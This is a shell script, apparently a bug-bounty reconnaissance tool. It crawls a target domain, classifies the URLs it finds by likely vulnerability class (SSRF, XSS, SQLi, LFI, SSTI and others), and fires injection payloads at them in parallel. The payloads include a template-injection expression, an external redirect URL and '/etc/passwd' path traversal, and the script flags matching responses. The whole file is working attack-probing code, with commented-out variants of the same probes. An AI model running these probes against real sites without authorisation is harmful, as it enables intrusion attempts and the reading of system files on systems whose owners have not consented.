#!/bin/sh
domain=$1
targetfolder=$2
resultfolder=$3
mkdir $resultfolder
gospider -s $1 -o $2 -t 4 -c 10 -d 4 -m 6   --no-redirect
gospider -s $1 -t 20 --robots --sitemap --js -c 10 -d 4 -m 6  --json >> "$resultfolder/spiderall.json"
cat $2/* | grep -o -E "(([a-zA-Z][a-zA-Z0-9+-.]*\:\/\/)|mailto|data\:)([a-zA-Z0-9\.\&\/\?\:@\+-\_=#%;,])*" | sort -u | qsreplace -a | grep "$1" > "$resultfolder/tmp-GoSpider.txt"
cat $2/*  | grep -o -E "(([a-zA-Z][a-zA-Z0-9+-.]*\:\/\/)|mailto|data\:)([a-zA-Z0-9\.\&\/\?\:@\+-\_=#%;,])*" | sort -u | uro| tee -a "$resultfolder/uniqueurls.txt"
sed "s/\?.*//" "$resultfolder/tmp-GoSpider.txt" | sort -u | sed -e 's/$/\?/' > "$resultfolder/tmp-LivePathsQuery.txt"
cat "$resultfolder/tmp-LivePathsQuery.txt" "$resultfolder/tmp-GoSpider.txt" | sort -u | qsreplace -a > "$resultfolder/paths.txt"
gf ssrf < "$resultfolder/paths.txt" > "$resultfolder/server-side-request-forgery.txt"
gf xss < "$resultfolder/paths.txt" > "$resultfolder/cross-site-scripting.txt"
gf redirect < "$resultfolder/paths.txt" > "$resultfolder/open-redirect.txt"
gf rce < "$resultfolder/paths.txt" > "$resultfolder/rce.txt"
gf idor < "$resultfolder/paths.txt" > "$resultfolder/insecure-direct-object-reference.txt"
gf sqli < "$resultfolder/paths.txt" > "$resultfolder/sql-injection.txt"
gf lfi < "$resultfolder/paths.txt" > "$resultfolder/local-file-inclusion.txt"
gf ssti < "$resultfolder/paths.txt" > "$resultfolder/server-side-template-injection.txt"
touch $resultfolder/output.txt
qsreplace "BHunters{{9*9}}" < "$resultfolder/server-side-template-injection.txt" | xargs -I % -P 100 sh -c 'curl -s "%" 2>&1 | grep -q "BHunters81" && echo "[+] Found endpoint likely to be vulnerable to SSTI: %" && echo "ssti - %" >> '$resultfolder/'output.txt'
qsreplace "https://www.testing123.com" < "$resultfolder/open-redirect.txt" | xargs -I % -P 100 sh -c 'curl -s "%" 2>&1 | grep -q "Location: https://www.testing123.com" && echo "[+] Found endpoint likely to be vulnerable to OR: %" && echo "op - %" >> '$resultfolder/'output.txt'
qsreplace "/etc/passwd" < "$resultfolder/local-file-inclusion.txt" |  xargs -I % -P 100 sh -c 'curl -s "%" 2>&1 | grep -q "root:x:" && echo "[+] Found endpoint likely to be vulnerable to LFI: %" && echo "lfi - %" >> '$resultfolder/'output.txt'

# qsreplace "bormaassti{{9*9}}" < "$resultfolder/server-side-template-injection.txt" | xargs -I % -P 100 sh -c 'curl -s "%" 2>&1 | echo "[+] Found endpoint likely to be vulnerable to SSTI: %" && echo "ssti - %" >> '$resultfolder/'output.txt'
# qsreplace "https://www.testing123.com" < "$resultfolder/open-redirect.txt" | xargs -I % -P 100 sh -c 'curl -s "%" 2>&1 | echo "[+] Found endpoint likely to be vulnerable to OR: %" && echo "op - %" >> '$resultfolder/'output.txt'
# qsreplace "/etc/passwd" < "$resultfolder/local-file-inclusion.txt" |  xargs -I % -P 100 sh -c 'curl -s "%" 2>&1 | echo "[+] Found endpoint likely to be vulnerable to LFI: %" && echo "lfi - %" >> '$resultfolder/'output.txt'

# echo "we"

